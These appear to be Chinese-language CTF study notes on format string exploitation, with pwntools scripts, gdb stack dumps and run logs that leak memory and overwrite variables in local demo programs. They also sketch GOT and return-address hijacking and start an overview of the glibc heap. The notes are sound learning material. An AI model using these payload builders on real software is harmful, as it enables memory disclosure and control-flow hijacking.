─────────────────────────────────────────────────────[ stack ]──── # printf(s); 的栈
0xffffccfc│+0x00: 0x080484ce  →  <main+99> add esp, 0x10     ← $esp
0xffffcd00│+0x04: 0xffffcd10  →  "%3$x" # 将会输出对应format string来说第3个参数，相对于printf来说是第4个参数
0xffffcd04│+0x08: 0xffffcd10  →  "%3$x"
0xffffcd08│+0x0c: 0x000000c2
0xffffcd0c│+0x10: 0xf7e8b6bb  →  <handle_intel+107> add esp, 0x10 # 将会被输出的内容 !!! # printf's parameter 4  !!!!!!
0xffffcd10│+0x14: "%3$x"     ← $eax
0xffffcd14│+0x18: 0xffffce00  →  0x00000001
0xffffcd18│+0x1c: 0x000000e0
>  c  # 输出后退出 [Inferior 1 (process 57442) exited normally]
f7e8b6bb # 输出的内容为 0xffffcd0c│+0x10: 0xf7e8b6bb 即esp+0x10 为printf的第4个参数 # 确实获得 printf 第 4 个参数所对应的值 f7e8b6bb
```





##### 泄露任意地址的内存

- 上例中 s 是 main 函数的局部变量，所以读取到的内容在栈上。调用输出函数`printf`时，第一个参数的值其实就是格式化字符串format string的地址
- 当上例`leakmemory.c`的输入为"%s"，可以看到`printf`的栈上参数 1 和 2 均指向`%s`，第一个`%s`指的是`printf`的格式化字符串地址，而第二个`%s`则是格式化字符串的`%s`对应参数。亦即：第二个`%s`被作为参数传递给第一个作为格式化字符串使用的`%s`
```assembly
──────────────────────────────────[ stack ]──── # printf(s); 的栈 # 当上例 leakmemory.c 的输入为"%s"
0xffffccfc│+0x00: 0x080484ce  →  <main+99> add esp, 0x10     ← $esp
0xffffcd00│+0x04: 0xffffcd10  →  0xff007325 ("%s"?) # 0xffffcd10: format string's address # 该地址存储 printf 的格式化字符串的地址
0xffffcd04│+0x08: 0xffffcd10  →  0xff007325 ("%s"?) # char* (address) as format string's 1st parameter # 格式化字符串的第一个参数
0xffffcd08│+0x0c: 0x000000c2
0xffffcd0c│+0x10: 0xf7e8b6bb  →  <handle_intel+107> add esp, 0x10
0xffffcd10│+0x14: 0xff007325 ("%s"?)  ← $eax # string "%s" 0x25=% 0x73=s # 既被用作格式化字符串 也被用作格式化字符串的第一个参数
```

```c
printf("addr%k$s"); // 获取某个指定地址addr的内容的方法
// 假设格式化字符串相对函数调用为第k个参数 addr是个地址，高概率为不可见字符。 // k: 格式化字符串地址相对于 printf 第一个参数来说是第k个参数
```

- `printf("addr%k$s")`**原理**：`printf`的第一个参数为format string的地址，`addr`被存储在format string的开头。用`%k$s`控制`printf`解析对于第一个参数（即 存储format string地址的地址）来说第`k`个参数(即format string)，将其解析为字符串的地址。也就达到了将`addr`视作地址，输出`addr`上内容的目的。



- 确定该格式化字符串为第几个参数的方式：  `[tag]%p%p%p%p%p%p...`     重复某个字符的机器字长来作为tag(32bit ELF下为4byte char)，后面跟上若干`%p`输出栈上的内容，如果内容与tag重复，就有很大把握说明该地址是格式化字符串的地址

```bash
$ ./leakmemory     # [tag]%p%p%p%p%p%p... 方法确定 格式化字符串 是函数的第几个参数
AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
00000001.22222222.ffffffff.AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
AAAA0xffffd3a00xf7fcb4100x80491890x414141410x702570250x702570250x702570250x702570250x702570250x702570250x702570250x8007025(nil)0xf7ffd000(nil)
```

- `0x41414141`在输出的第五个参数，则为格式化字符串的第4个参数。若输入`%4$s`会造成segmentation fault，是因为尝试将`%4$s`表示的地址`0x73243425`进行解析。vmmap可以查看各个地址段的权限

```assembly
────────── stack ──── # 输入 AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p 时 # printf(s); 的栈
0xffffd38c│+0x0000: 0x080491e5  →  <main+115> add esp, 0x10      ← $esp
0xffffd390│+0x0004: 0xffffd3a0  →  "AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p" # 0xffffd3a0 为 format string 的地址
0xffffd394│+0x0008: 0xffffd3a0  →  "AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p"
0xffffd398│+0x000c: 0xf7fcb410  →  0x080482b8  →  "GLIBC_2.0"
0xffffd39c│+0x0010: 0x08049189  →  <main+23> add ebx, 0x2e77
0xffffd3a0│+0x0014: "AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p" # format string 所在的地址 # 相对于0xffffd390来说是第 4 个参数
0xffffd3a4│+0x0018: "%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p" .........
```



- 输出 scanf 地址的脚本，疑似由于某些额外的保护措施/gcc的影响，导致无法输出scanf的地址

```python
from pwn import *   # 分析 leakmemory.c 的脚本 可以输出 scanf 的地址 # 有效性存疑
context.log_level = "DEBUG"
sh = process('./leakmemory')
leakmemory = ELF('./leakmemory')
__isoc99_scanf_got = leakmemory.got['__isoc99_scanf']  # __isoc99_scanf 的got表项地址
print("__isoc99_scanf_got: ", hex(__isoc99_scanf_got))  # __isoc99_scanf_got:  0x804c014
payload = p32(__isoc99_scanf_got) + b'%4$s' # scanf 的got表地址 + %4$s
print("payload:", payload) # payload: b'\x14\xc0\x04\x08%4$s'
# gdb.attach(sh) # [+] Waiting for debugger: Done
sh.sendline(payload) # Sent 0x9 bytes: 14 c0 04 08  25 34 24 73  0a  │····│%4$s│·│
sh.recvuntil(b'%4$s\n')
temp = sh.recv() # 按照原本脚本的意思 这里应该收到8 bytes 前4byte为__isoc99_scanf_got，后 4byte 为__isoc99_scanf_got上存储的内容
print("sh.recv(): ", temp, type(temp), len(temp)) # sh.recv():  b'\x14\xc0\x04\x08' <class 'bytes'> 4
print("hex(u32(temp)): ", hex(u32(temp))) # hex(u32(temp)):  0x804c014
temp = sh.recv()
# print(hex(u32(sh.recv()[4:8])))  # remove the first bytes of __isoc99_scanf@got
sh.interactive()
```

- 运行上面的脚本时的输出

```python
$ python leakmemory.py
[+] Starting local process './leakmemory' argv=[b'./leakmemory'] : pid 36823
[DEBUG] PLT 0x8049030 printf
[DEBUG] PLT 0x8049040 __libc_start_main
[DEBUG] PLT 0x8049050 __isoc99_scanf
[*] '/home/kali/CTF/pwn/leakmemory'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
__isoc99_scanf_got:  0x804c014
payload: b'\x14\xc0\x04\x08%4$s'
[*] running in new terminal: /usr/bin/gdb -q  "./leakmemory" 36823
[DEBUG] Launching a new terminal: ['/usr/bin/x-terminal-emulator', '-e', '/usr/bin/gdb -q  "./leakmemory" 36823']
[+] Waiting for debugger: Done
[DEBUG] Sent 0x9 bytes:
    00000000  14 c0 04 08  25 34 24 73  0a                        │····│%4$s│·│
    00000009
[DEBUG] Received 0x24 bytes:
    00000000  30 30 30 30  30 30 30 31  2e 32 32 32  32 32 32 32  │0000│0001│.222│2222│
    00000010  32 2e 66 66  66 66 66 66  66 66 2e 14  c0 04 08 25  │2.ff│ffff│ff.·│···%│
    00000020  34 24 73 0a                                         │4$s·│
    00000024
[DEBUG] Received 0x4 bytes:
    00000000  14 c0 04 08                                         │····│
    00000004
sh.recv():  b'\x14\xc0\x04\x08' <class 'bytes'> 4
hex(u32(temp)):  0x804c014
[*] Switching to interactive mode
[*] Process './leakmemory' stopped with exit code 0 (pid 36823)
[*] Got EOF while reading in interactive
```
- 上述脚本运行时，会启动gdb，在gdb中下断点，continue，查看栈的变化：

```assembly
gef➤  b printf   # gdb窗口出来后 首先下断点   # Breakpoint 1 at 0xf7dd8060: file printf.c, line 32.
gef➤  c #Continuing.
──────────────────────────────── stack ──── # printf("%08x.%08x.%08x.%s\n", a, b, c, s); 的栈; int a = 1, b = 0x22222222, c = -1;
0xfff7022c│+0x0000: 0x080491d6  →  <main+100> add esp, 0x20      ← $esp
0xfff70230│+0x0004: 0x0804a00b  →  "%08x.%08x.%08x.%s\n" # format string
0xfff70234│+0x0008: 0x00000001
0xfff70238│+0x000c: 0x22222222
0xfff7023c│+0x0010: 0xffffffff
0xfff70240│+0x0014: 0xfff70250  →  0x0804c014  →  0xf7dd9100  →  <__isoc99_scanf+0> call 0xf7ec63a9 <__x86.get_pc_thunk.ax>
0xfff70244│+0x0018: 0xfff70250  →  0x0804c014  →  0xf7dd9100  →  <__isoc99_scanf+0> call 0xf7ec63a9 <__x86.get_pc_thunk.ax>
0xfff70248│+0x001c: 0xf7f84410  →  0x080482b8  →  "GLIBC_2.0"
gef➤  c  # Continuing.
────────────────────────────────────────── stack ────  # printf(s); 的栈
0xfff7023c│+0x0000: 0x080491e5  →  <main+115> add esp, 0x10      ← $esp
0xfff70240│+0x0004: 0xfff70250  →  0x0804c014  →  ...# ...与下一行一样 # format string # 0x804c014 是 scanf 的got表项地址
0xfff70244│+0x0008: 0xfff70250  →  0x0804c014  →  0xf7dd9100  →  <__isoc99_scanf+0> call 0xf7ec63a9 <__x86.get_pc_thunk.ax>
0xfff70248│+0x000c: 0xf7f84410  →  0x080482b8  →  "GLIBC_2.0"
0xfff7024c│+0x0010: 0x08049189  →  <main+23> add ebx, 0x2e77
0xfff70250│+0x0014: 0x0804c014  →  0xf7dd9100  →  <__isoc99_scanf+0> call 0xf7ec63a9 <__x86.get_pc_thunk.ax> # format string所在位置
0xfff70254│+0x0018: "%4$s"
0xfff70258│+0x001c: 0xf7fb6900  →  0xf7fb6980  →  0x00000000
────────────────────────────────────────── trace ────
[#0] 0xf7dd8060 → __printf(format=0xfff70250 "\024\300\004\b%4$s")
[#1] 0x80491e5 → main()
```

- `0x0804c014`是 `scanf` 的got表项地址，可以直接由ELF文件得出，`0xf7dd9100`则是`scanf`的真实地址，由脚本的payload利用格式化字符串漏洞得出。（按ctfwiki描述，脚本输出的应该是`0xf7dd9100`，实际脚本输出为`0x0804c014`）

作为对照，放上ctf-wiki中展示的printf(s); 的栈：

```assembly
─────────────────────────────────────[ stack ]──── # ctf-wiki 中# printf(s); 的栈
0xffbbf8dc│+0x00: 0x080484ce  →  <main+99> add esp, 0x10     ← $esp
0xffbbf8e0│+0x04: 0xffbbf8f0  →  0x0804a014  →  0xf76280c0  →  <__isoc99_scanf+0> push ebp
0xffbbf8e4│+0x08: 0xffbbf8f0  →  0x0804a014  →  0xf76280c0  →  <__isoc99_scanf+0> push ebp
0xffbbf8e8│+0x0c: 0x000000c2
0xffbbf8ec│+0x10: 0xf765c6bb  →  <handle_intel+107> add esp, 0x10
0xffbbf8f0│+0x14: 0x0804a014  →  0xf76280c0  →  <__isoc99_scanf+0> push ebp  ← $eax
0xffbbf8f4│+0x18: "%4$s"
0xffbbf8f8│+0x1c: 0x00000000
```

- 并不是所有的偏移机器字长的整数倍，都可以直接用相应参数来获取，有时，需要对输入的格式化字符串进行填充，使得想要打印的地址内容的地址位于机器字长整数倍的地址处，类似于：
- `[padding][addr]`

#### 覆盖内存

> 上面一节讲的是 泄露内存，是读取内存，这一节将介绍怎么写内存，即覆盖内存

- `%n`: 不输出字符，把已经成功输出的字符个数写入对应的整型指针参数所指的变量
- 覆盖某个地址的变量，基本上是构造类似如下的payload:

```c
...[overwrite addr]....%[overwrite offset]$n      // e.g. p32(c_addr) + b'%012d%6$n'
```

- ... 表示填充内容，overwrite addr 表示要覆盖的地址，overwrite offset 表示要覆盖的地址存储的位置为输出函数的格式化字符串的第几个参数

1. 确定覆盖地址
2. 确定相对偏移
3. 进行覆盖

```c
#include <stdio.h> // 示例程序 overwrite.c // gcc -fno-stack-protector -m32 -o -no-pie overwrite overwrite.c
int a = 123, b = 456; // 后续在覆盖任意地址内存中，想要覆盖的变量
int main() {
    int c = 789; // 0x315 // 后续在覆盖栈内存中，想要覆盖的变量
    char s[100];
    printf("%p\n", &c); // 程序这里已经输出了c的地址
    scanf("%s", s);
    printf(s); // 漏洞利用点
    if (c == 16) { // 覆盖栈内存 一节中想要命中的判断
        puts("modified c.");
    } else if (a == 2) { // 覆盖任意地址内存 覆盖为小数字 一节中想要命中的判断
        puts("modified a for a small number.");
    } else if (b == 0x12345678) { // 覆盖任意地址内存 覆盖为大数字 一节中想要命中的判断
        puts("modified b for a big number!");
    }
    return 0;
}
```

##### 覆盖栈内存

- `p32(c_addr)`为4B(4 char)，是c的地址，为凑齐16B (16 char)，需要用`%012d`来再输出多12个字符，然后用`%6$n`将输出的字符个数，即16，写到变量c去。`%6$n`的 6 表示format string相对于栈第一个参数来说是第6个参数(即`printf`的第7个参数)，可以通过gdb调试分析漏洞利用点`printf`的栈帧得到

```python
from pwn import *  # 将 overwrite.c 中的变量 c 覆盖为16
def forc():
    sh = process('./overwrite')
    c_addr = int(sh.recvuntil('\n', drop=True), 16)
    print(hex(c_addr))  # 0xffd582bc # 注意这个地址并非每次运行都一样
    payload = p32(c_addr) + b'%012d' + b'%6$n'  # b'\x8c\x01\x84\xff%012d%6$n'
    print("payload: ", payload) # [ addr of c, %012d%6$n ]
    # gdb.attach(sh)
    sh.sendline(payload)
    print(sh.recv())
    sh.interactive()
context.log_level = "DEBUG"
forc()
```

- 下方输出表明：payload控制`printf(s);`输出16 char，并且控制程序命中`if (c == 16)`，即将 c 的值覆盖为16

```bash
$ python overwrite.py  # 运行上述脚本后，终端的输出
[+] Starting local process './overwrite' argv=[b'./overwrite'] : pid 131771
[DEBUG] Received 0xb bytes:           b'0xffd582bc\n'   # printf("%p\n", &c);
0xffd582bc   # print(hex(c_addr)) c 的地址
b'\xbc\x82\xd5\xff%012d%6$n'  # [addr of c, %012d%6$n ] 
[*] running in new terminal: /usr/bin/gdb -q  "./overwrite" 131771
[DEBUG] Launching a new terminal: ['/usr/bin/x-terminal-emulator', '-e', '/usr/bin/gdb -q  "./overwrite" 131771']
[+] Waiting for debugger: Done  # gdb.attach(sh)
[DEBUG] Sent 0xe bytes:  # sh.sendline(payload)
    00000000  bc 82 d5 ff  25 30 31 32  64 25 36 24  6e 0a        │····│%012│d%6$│n·│
    0000000e
[DEBUG] Received 0x1c bytes:  # sh.recv() # 第一行共16bytes 说明payload成功控制输出16个字符
    00000000  bc 82 d5 ff  2d 30 30 30  30 32 37 38  34 36 38 30  │····│-000│0278│4680│
    00000010  6d 6f 64 69  66 69 65 64  20 63 2e 0a               │modi│fied│ c.·│
    0000001c
b'\xbc\x82\xd5\xff-00002784680modified c.\n'  ......  # print(sh.recv())  # modified c 表明 c 已经被更改为 16
```

- `printf(s);` 时的栈：

```assembly
───────────── stack ────  # printf(s); 时的栈
0xffd5823c│+0x0000: 0x080484d7  →  <main+76> add esp, 0x10       ← $esp
0xffd58240│+0x0004: 0xffd58258  →  0xffd582bc  →  0x00000315 # 0xffd58258 addr of format string
0xffd58244│+0x0008: 0xffd58258  →  0xffd582bc  →  0x00000315 # 0xffd582bc 为 c 的地址
0xffd58248│+0x000c: 0xf7f07410  →  0x0804829c  →  "GLIBC_2.0"
0xffd5824c│+0x0010: 0x00000001
0xffd58250│+0x0014: 0x00000000
0xffd58254│+0x0018: 0x00000001
0xffd58258│+0x001c: 0xffd582bc  →  0x00000315 # 0xffd58258 为format string起始地址 0xffd582bc为c的地址 # 0x315=789 c的原始值 
────────────── trace ────
[#0] 0xf7d5b060 → __printf(format=0xffd58258 "\274\202\325\377%012d%6$n")
[#1] 0x80484d7 → main()
gef➤  hexdump byte 0xffd58258 32 # 以bytes显示格式化字符串所在地址存储的内容，展示32byte
0xffd58258     bc 82 d5 ff 25 30 31 32 64 25 36 24 6e 00 d5 ff    ....%012d%6$n...
0xffd58268     02 00 00 00 66 8d f2 f7 34 80 04 08 00 00 00 00    ....f...4.......
```

- `0xffd58258`为格式化字符串format string的首地址，`0xffd58258`上的前4byte又是变量c的地址`0xffd582bc``
- `%6$n`将输出的字符数(16)存储到format string的第6个参数(`0xffd58258`)所存的整型指针(c的地址`0xffd582bc`)上。效果：把c的值覆盖为16



##### 覆盖任意地址内存

> 修改 data 段的变量为：1. 一个小数字(小于机器字长的数字)；2. 一个大数字

- 这一节及下一节将要实现：
  1. 将全局变量 a 覆盖为2。利用payload `aa%k$nbb[addr]`
  2. 将全局变量 b 覆盖为 0x12345678。利用`%6$hhn`分多部分覆盖



- 将全局变量a覆盖为2的方法：`aa%8$nbb[addr]`。由前面的分析，format string相对于`printf`第 1 个参数来说是第 6 个参数，而现在`aa%8`占据了第6个参数，`$nbb`占据了第7个参数，所以`[addr]`就变成了第8个参数。同理，可以使用`aa%9$nbbcccc[addr]`... 这里以4为倍数，用b来凑数对齐，是因为程序是32bit程序

```cpp
aa%k$nbb[addr]  // tips: 该例说明地址不一定要放在format string开头
```

- a的数量取决于想将[addr]覆盖为多少，b的数量则取决于机器字长(32/64 bit)，k 取决于 aa%k$nbb 总长度与原本 format string 是第几个参数

```python
from pwn import *  # 将 overwrite.c 中的变量 c 覆盖为16
def fora():
    sh = process('./overwrite')
    a_addr = 0x0804A024 # 该地址通过IDA静态分析得到，a是已初始化全局变量，在.data段，不在堆栈上
    payload = b'aa%8$nbb' + p32(a_addr) # aa%8$nbb[addr] # aa输出两个字符，%8$n
    sh.sendline(payload)
    print(sh.recv()) # 0xff9ac76c\naabb$\xa0\x04\x08modified a for a small number.\n
    sh.interactive()
context.log_level = "DEBUG"
fora()
```

```bash
$ python overwrite.py # 运行上述脚本
[+] Starting local process './overwrite' argv=[b'./overwrite'] : pid 2581307
[DEBUG] Sent 0xd bytes:
    00000000  61 61 25 38  24 6e 62 62  24 a0 04 08  0a           │aa%8│$nbb│$···│·│ # payload: aa%8$nbb[addr]
    0000000d
[DEBUG] Received 0x32 bytes:
    00000000  30 78 66 66  39 61 63 37  36 63 0a 61  61 62 62 24  │0xff│9ac7│6c·a│abb$│ # recv: printf("%p\n", &c); aabb
    00000010  a0 04 08 6d  6f 64 69 66  69 65 64 20  61 20 66 6f  │···m│odif│ied │a fo│ # 0804A024 为全局变量 a 的地址
    00000020  72 20 61 20  73 6d 61 6c  6c 20 6e 75  6d 62 65 72  │r a │smal│l nu│mber│ # modified a for a small number.
    00000030  2e 0a                                               │.·│                  # 说明命中了 else if (a == 2) 分支
    00000032
b'0xff9ac76c\naabb$\xa0\x04\x08modified a for a small number.\n'   .........
```



##### 用 hh / h 分块覆盖

>  本节将全局变量 b 覆盖为 0x12345678。注意本节默认已经得到了fmt str 地址相对于printf第 1 个参数为第 6 个参数

- `hh` 对于整数类型，`printf`期待一个从`char`提升的`int`尺寸的整型参数。`$hhn`会把输出字符数存在一`char`地址上，即覆盖指针指向的地址上的 1Byte
- `h`  对于整数类型，`printf`期待一个从`short`提升的`int`尺寸的整型参数。`$hn`会把输出字符数存在一`short`地址上，即覆盖指针指向的地址上的 2Byte

在 x86 和 x64 的体系结构中，变量的存储格式为以**小端**存储，即最低有效位存储在低地址。即希望按照如下方式覆盖（左边为地址，右边为覆盖内容）：

```python
0x0804A028 0x78 # 该地址为全局变量 b 的地址(占4B) 由IDA分析得出
0x0804A029 0x56
0x0804A02a 0x34
0x0804A02b 0x12
```
- 故可构造如下payload，其中padx用于控制后面的`'%6$hhn'`写入的数字是多少
```python
p32(0x0804A028)+p32(0x0804A029)+p32(0x0804A02a)+p32(0x0804A02b)+pad1+'%6$hhn'+pad2+'%7$hhn'+pad3+'%8$hhn'+pad4+'%9$hhn'
```

- 在程序中需要对pad的大小进行计算，如果pad大小应为x，则使用`%xc`输出x个字符，如果当前已输出字符数过大，则再输出过量字符，以`0xff`为上界溢出

```python
from pwn import *  # 将 overwrite.c 中的全局变量 b 覆盖为 0x12345678
def fmt(prev, word, index): # 构造 padx + '%k$hhn'
    # prev: 前一个写入的数字[0, 0xff]
    # word: 将要写入的数字[0, 0xff]  # 利用类似 %kc / %5c 补充 k / 5 个字符
    # index: 该数字将要写入的地址存在第 index 个参数(相对于fmt str指针来说)
    fmtstr = b""
    if(prev < word):  # 前一个数字 比 将要写入的数字 小
        result = word - prev  # 追加输出相差的字符数 word - prev 个
        fmtstr = b"%" + bytearray(str(result), "ascii") + b"c" # 构造 %xc 输出 x 个char
    elif(prev == word):  # 前一个数字 和 将要写入的数字 相等，不需要追加输出字符
        pass  # 直接跳到构造 %k$hhn 的步骤，写入的数字与前一个相同
    else:  # prev > word # 前一个数字 比 将要写入的数字 大
        result = 256 + word - prev  # 以 0xff 为上限溢出
        fmtstr = b"%" + bytearray(str(result), "ascii") + b"c" # 构造 %xc 输出 x 个char
    fmtstr += b"%" + bytearray(str(index), "ascii") + b"$hhn"  # 构造 %k$hhn
    return fmtstr

def fmt_str(offset, size, addr, target): # 构造整个payload 
    # offset: 要覆盖的地址最初的偏移; size:机器字长; addr: 将要覆盖的地址; target: 要覆盖为的目的变量值
    payload = b""
    for i in range(4):
        if(size == 4):
            payload += p32(addr + i)  # 32bit 程序
        else:
            payload += p64(addr + i)  # 64bit 程序
    print(payload.hex())  # 28a0040829a004082aa004082ba00408 # 此时payload内容为4个地址
    prev = len(payload)  # 0x10 # 4个32bit的地址 4*4B = 0x10 B
    for i in range(4):
        # 具体传参: 0x10 0x78 0x6; 0x78 0x56 0x7; 0x56 0x34 0x8; 0x34 0x12 0x9
        payload += fmt(prev, (target >> i * 8) & 0xff, offset + i)
        prev = (target >> i * 8) & 0xff
    return payload

def forb(): # exploit
    sh = process('./overwrite')
    payload = fmt_str(6, 4, 0x0804A028, 0x12345678)  # 0x0804A028：全局变量b的地址，IDA分析可得
    print("payload:", payload, "\npayload:", payload.hex())
    sh.sendline(payload)
    print(sh.recv())
    sh.interactive()

context.log_level = "DEBUG"
forb()
```

- 上方脚本的运行结果如下: 

```bash
$ python overwrite.py # 将 overwrite.c 中的全局变量 b 覆盖为 0x12345678
[+] Starting local process './overwrite' argv=[b'./overwrite'] : pid 2582229
28a0040829a004082aa004082ba00408 # 0804A028 为全局变量 b 的地址
payload: b'(\xa0\x04\x08)\xa0\x04\x08*\xa0\x04\x08+\xa0\x04\x08%104c%6$hhn%222c%7$hhn%222c%8$hhn%222c%9$hhn'
payload: 28a0040829a004082aa004082ba00408253130346325362468686e253232326325372468686e253232326325382468686e253232326325392468686e
[DEBUG] Sent 0x3d bytes:
    00000000  28 a0 04 08  29 a0 04 08  2a a0 04 08  2b a0 04 08  │(···│)···│*···│+···│
    00000010  25 31 30 34  63 25 36 24  68 68 6e 25  32 32 32 63  │%104│c%6$│hhn%│222c│
    00000020  25 37 24 68  68 6e 25 32  32 32 63 25  38 24 68 68  │%7$h│hn%2│22c%│8$hh│
    00000030  6e 25 32 32  32 63 25 39  24 68 68 6e  0a           │n%22│2c%9│$hhn│·│
    0000003d
[DEBUG] Received 0x33a bytes:
    00000000  30 78 66 66  65 31 33 37  66 63 0a 28  a0 04 08 29  │0xff│e137│fc·(│···)│
    00000010  a0 04 08 2a  a0 04 08 2b  a0 04 08 20  20 20 20 20  │···*│···+│··· │    │
    00000020  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
    *
    00000080  20 20 98 20  20 20 20 20  20 20 20 20  20 20 20 20  │  · │    │    │    │
    00000090  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
    *
    00000160  10 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │·   │    │    │    │
    00000170  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
    *
    00000230  20 20 20 20  20 20 20 20  20 20 20 20  20 20 01 20  │    │    │    │  · │
    00000240  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
    *
    00000310  20 20 20 20  20 20 20 20  20 20 20 20  00 6d 6f 64  │    │    │    │·mod│
    00000320  69 66 69 65  64 20 62 20  66 6f 72 20  61 20 62 69  │ifie│d b │for │a bi│
    00000330  67 20 6e 75  6d 62 65 72  21 0a                     │g nu│mber│!·│
    0000033a
b'0xffe137fc\n(\xa0\x04\x08)\xa0\x04\x08*\xa0\x04\x08+\xa0\x04\x08                                                                                                       \x98                                                                                                                                                                                                                             \x10                                                                                                                                                                                                                             \x01                                                                                                                                                                                                                             \x00modified b for a big number!\n'
```

> 也可以利用 `%n` 分别对每个地址进行写入，也可以得到对应的答案，但是由于我们写入的变量都只会影响由其开始的四个字节，所以最后一个变量写完之后，我们可能会修改之后的三个字节，如果这三个字节比较重要的话，程序就有可能因此崩溃。而采用`%hhn` 则不会有这样的问题，因为这样只会修改相应地址的一个字节



### hijack GOT

> 劫持got表

由于下述两个原因，可以修改某个libc函数的got表项内容为另一个libc函数的地址，以此控制程序。e.g. 修改printf的got表项为system函数的地址，

1. 目前的 C 程序中，libc 中的函数是通过 GOT 表来跳转的
2. 在没有开启 RELRO 保护时，每个 libc 的函数对应的 GOT 表项可以被修改的

cases:

- `hijack_got_fmt_str_CCTF_2016_pwn3`: 利用`printf(s)`这样的漏洞，获取`puts`真实地址，得到libc版本和`system`地址，覆盖`puts@got`为`system`



### hijack retaddr

- 利用格式化字符串漏洞劫持程序的返回地址到想要执行的地址

cases:

- `fmt_str_hijack_retaddr_sangebaimao_pwnme_k0`: 输入用户名密码，用户名密码在栈上，相邻，用户名输入返回地址，密码用`%2218d%8$hn`来改变返回地址的值







---

## Heap: Ptmalloc2

> 主要是 Glibc Heap: ptmalloc2 利用
>
> 阅读/复习建议：Heep Overview里面的很详细的e.g. bins 可以跳过，先看后面三级标题的结构
>
> https://zhuanlan.zhihu.com/p/352445428 ptmalloc内存管理器 设计假设 malloc/free流程
>
> https://www.bilibili.com/read/cv5280184/ 二进制安全之堆溢出（系列） 堆基础 & 结构（一)

- 对于不同的应用来说，由于内存的需求各不相同等特性，因此目前堆的实现有很多种: 

```python
dlmalloc  – General purpose allocator
ptmalloc2 – glibc  # 以 glibc 中堆的实现为主进行介绍 glibc-2.3.x. 之后，glibc 中集成了ptmalloc2
jemalloc  – FreeBSD and Firefox
tcmalloc  – Google
libumem   – Solaris
```

在 glibc 内部有精心设计的数据结构来管理heap。与堆相应的数据结构主要分为

- 宏观结构，包含堆的宏观信息，可以通过这些数据结构索引堆的基本信息。
- 微观结构，用于具体处理堆的分配与回收中的内存块。

> scanf在某些情况下会调用malloc/mmap来暂存输入的数据。e.g.` canf(%d, num)`

### Heap Overview

堆：程序运行过程中，堆可以提供动态分配的内存，允许程序申请大小未知的内存。实质上是程序虚拟地址空间的一块连续的线性区域，由低地址向高地址增长

堆管理器：一般称管理堆的那部分程序为堆管理器。堆管理器处于用户程序与内核中间，主要工作：

1. 响应用户的申请内存请求，向OS申请内存，然后返回给用户程序。为保证内存管理的高效性，内核一般会预先分配很大一块连续内存，堆管理器通过某种算法管理这块内存。只有堆空间不足时，堆管理器才会再次与OS交互
2. 管理用户释放的内存。一般，用户释放的内存不会直接返还给OS，而是由堆管理器管理，这些释放了的内存可以来响应用户新的内存申请请求。

> Wolfram Gloger 在 Doug Lea 的基础上改进使其支持多线程，即 ptmalloc。glibc-2.3.x. 后，glibc 集成 ptmalloc2
>
> 目前 Linux 标准发行版中使用的堆分配器是 glibc 中的堆分配器：ptmalloc2。ptmalloc2 主要是通过 malloc/free 函数来分配和释放内存块
>
> 内存分配，使用莞城中，Linux的基本内存管理思想：**只有当真正访问一个地址的时候，系统才会建立虚拟页面与物理页面的映射关系**。OS虽然给程序分配了很大一块内存，但只是虚拟内存，只有当用户使用到相应的内存时，OS才会真正分配物理页面给用户使用。

```bash
# gdb gef 与堆有关的常见指令 
heap # 查看 heap xxx 有关的可用指令
heap bins
heap chunks
```





#### malloc and free

> 在glibc 的 [malloc.c](https://github.com/iromise/glibc/blob/master/malloc/malloc.c#L448) 中有相应说明
>
> 

`malloc(size_t n)`: 返回对应大小字节的内存块指针

- n == 0: 返回当前OS允许的堆的最小内存块. returns a minumum-sized chunk. (The minimum  size is 16 bytes on most 32bit systems, and 24 or 32 bytes on 64bit  systems.)
- n < 0: 由于大部分OS的`size_t`是无符号数，所以程序会申请很大的内存空间，通常会因空间不足失败

`free(void* p)`: 释放由p指向的内存块。p可能是malloc, realloc得到的

- p == NULL: 不执行任何操作
- p已释放: 再次释放会出现任意效果，即 double free
- 除非通过`mallopt`禁用，释放很大内存空间时，程序会将这些内存空间还给OS以减小程序使用的内存空间

##### (s)brk

> https://www.huaweicloud.com/articles/12453899.html Linux进程分配内存的两种方式--brk() 和mmap() 挺详细的，带案例说明

- 应用程序调用malloc(OS无关代码)，malloc调用依赖OS的库函数`__brk / __mmap` 陷入内核态，最后触发系统调用`sys_brk / sys_mmap_pgoff`

![](https://raw.githubusercontent.com/kokifish/pictures/master/CTF_pic/brk_and_mmap.png)

![](https://raw.githubusercontent.com/kokifish/pictures/04cb1b2b6abf8929ddd76b404144e1985959df11/CTF_pic/segments_chinese.jpg)

32bit OS虚拟内存空间(ASLR open): 注意图中由于开启了ASLR, `start_brk(end_data)`与BBS段末尾有一段随机偏移

![](https://raw.githubusercontent.com/kokifish/pictures/master/CTF_pic/program_virtual_address_memory_space.png)



```cpp
/* sbrk and brk example */
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
int main(){
    void *curr_brk, *tmp_brk = NULL;
    printf("Welcome to sbrk example:%d\n", getpid()); // Welcome to sbrk example:6141
    // sbrk(0) gives current program break location
    tmp_brk = curr_brk = sbrk(0);
    printf("Program Break Location1:%p\n", curr_brk); // Program Break Location1:0x804b000
    getchar(); // start_brk = brk = end_data = 0x804b000  ← 首次调用brk前
    // brk(addr) increments/decrements program break location
    brk(curr_brk+4096); // 首次调用brk
    curr_brk = sbrk(0);
    printf("Program break Location2:%p\n", curr_brk); // Program Break Location2:0x804c000
// cat /proc/6141/maps
// 0804a000-0804b000 rw-p 00001000 08:01 539624 /home/sploitfun/ptmalloc.ppt/syscalls/sbrk
// 0804b000-0804c000 rw-p 00000000 00:00 0      [heap] # 出现了heap堆; rw-p 堆可读可写，属隐私数据
// b7e21000-b7e22000 rw-p 00000000 00:00 0
    getchar();

